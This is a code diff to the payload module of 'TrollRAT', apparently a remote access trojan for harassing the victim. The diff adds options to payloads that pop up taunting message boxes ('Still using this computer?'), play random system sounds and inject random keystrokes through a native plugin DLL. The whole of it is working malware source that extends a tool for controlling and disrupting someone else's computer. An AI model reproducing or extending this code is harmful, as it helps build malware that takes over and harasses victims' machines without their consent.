@@ -10,18 +10,28 @@ namespace TrollRATPayloads.Payloads
 {
     public class PayloadMessageBox : LoopingPayload
     {
-        [DllImport("Plugins\\TrollRATNative.dll", CharSet=CharSet.Auto)]
-        public static extern void payloadMessageBox(string text, string label, int style);
+        [DllImport("Plugins\\TrollRATNative.dll", CharSet = CharSet.Auto)]
+        public static extern void payloadMessageBox(string text, string label, int style, int mode);
+
+        protected PayloadSettingSelect mode = new PayloadSettingSelect(3, "Mode",
+            new string[] { "Fixed Text", "Random Error Messages" });
 
         protected PayloadSettingString text = new PayloadSettingString("Still using this computer?", "Message Box Text");
         protected PayloadSettingString label = new PayloadSettingString("lol", "Window Title");
+
+        protected PayloadSettingSelect icon = new PayloadSettingSelect(3, "Message Box Icon",
+            new string[] {"None", "Error", "Question", "Warning", "Information", "Random"});
 
         public PayloadMessageBox()
         {
             name = "Message Boxes";
 
+            settings.Add(mode);
+
             settings.Add(text);
             settings.Add(label);
+
+            settings.Add(icon);
 
             actions.Add(new PayloadActionClearWindows());
         }
@@ -33,7 +43,11 @@ namespace TrollRATPayloads.Payloads
 
         private void messageBoxThread()
         {
-            payloadMessageBox(text.Value, label.Value, 0x1000 | 0x30);
+            int i = icon.Value;
+            if (i == 5)
+                i = new Random().Next(1, 5);
+
+            payloadMessageBox(text.Value, label.Value, 0x1000 | (i << 4), mode.Value);
         }
     }
 
@@ -64,13 +78,25 @@ namespace TrollRATPayloads.Payloads
     public class PayloadSound : LoopingPayload
     {
         [DllImport("Plugins\\TrollRATNative.dll")]
-        public static extern void payloadSound();
+        public static extern void payloadSound(int sound);
 
-        public PayloadSound() : base(20) { name = "Random Sounds"; }
+        protected PayloadSettingSelect sound = new PayloadSettingSelect(6, "Sound Type",
+            new string[] { "Error", "Warning", "Information", "Question", "Startup", "Shutdown", "Random" });
+
+        public PayloadSound() : base(30)
+        {
+            settings.Add(sound);
+
+            name = "Play System Sounds";
+        }
 
         protected override void execute()
         {
-            payloadSound();
+            int i = sound.Value;
+            if (i == 6)
+                i = new Random().Next(0, 4);
+
+            payloadSound(i);
         }
     }
 
@@ -80,7 +106,7 @@ namespace TrollRATPayloads.Payloads
 
         protected override void execute()
         {
-            SendKeys.SendWait(((Char)new Random().Next('a', 'z')).ToString());
+            SendKeys.SendWait(((Char)new Random().Next('a', 'z'+1)).ToString());
         }
     }
 
